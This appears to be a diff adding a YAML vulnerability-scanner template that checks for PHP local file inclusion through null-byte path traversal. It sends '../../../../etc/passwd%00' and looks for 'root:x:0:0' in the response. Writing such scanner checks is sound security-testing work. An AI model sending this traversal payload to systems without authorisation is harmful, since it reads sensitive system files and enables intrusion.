@@ -1,0 +1,22 @@
+id: patt-lfi-null-01-path
+name: 'PATT lfi patt-lfi-null-01 via path'
+severity: high
+type: active
+tags:
+  - lfi
+  - patt
+  - filterext
+requires:
+  - php
+description: 'PATT NULL Bytes %00 truncates extension .php (PHP old). [patt:patt-lfi-null-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      path:
+        - '../../../../etc/passwd%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
